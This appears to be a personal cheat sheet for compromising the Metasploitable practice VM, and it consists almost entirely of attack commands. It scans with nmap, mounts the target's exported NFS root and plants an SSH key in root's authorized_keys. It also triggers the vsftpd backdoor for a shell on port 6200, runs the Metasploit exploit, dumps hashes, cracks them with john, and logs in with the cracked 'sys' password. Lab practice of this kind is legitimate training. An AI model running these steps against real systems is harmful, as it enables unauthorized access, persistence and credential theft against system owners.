- ip a    
- sudo nmap -n -Pn -sS [ip adress here] --open    

- sudo nmap -n -Pn -sV [ip adress here] --open        

- sudo rlogin -l root [ip adress here]      

- 2049 nfs file sharing stuff   

- sudo rpcinfo -p [ip adress here]    

- sudo showmount -h
- sudo showmount -e [ip adress here]
- / * means everything    

- mkdir /tmp/metasploit
- sudo mount -t nfs [ip adress here]:/  /tmp/metasploit 
- [generate public ssh key](https://git-scm.com/book/en/v2/Git-on-the-Server-Generating-Your-SSH-Public-Key)    
- sudo cat ~/.ssh/id_rsa.pub >> /tmp/metasploit/root/.ssh/authorized_keys   
- sudo cat ~/.ssh/id_rsa.pub  
- ssh root@ipaddress
- put your public key in the file and save it
- ssh root@ipaddress - now it works
- sudo umount /tmp/metasploit
- telnet [ip adress here] 21(this is port) - user asd:)metasploitable login: (this smile triggers backdoor for 6200port)
- pass asd
- telnet [ip adress here] 6200(this is port) 
- ls;
- whoami;
- sudo msfconsole
- search ftp
- search VSFTPD
- use exploit/unix/ftp
- show options
- set rhosts [ip adress here]
- run[attack]
- hashdump
- use post/linux/gather/hashdump
- show options
- set session 1
- run
- sudo john linux-hashes-password.txt --show
sys:batman:3:3....
- ssh sys@[ip adress here]
- pass = batman
- 
- 
- 
- 
- 
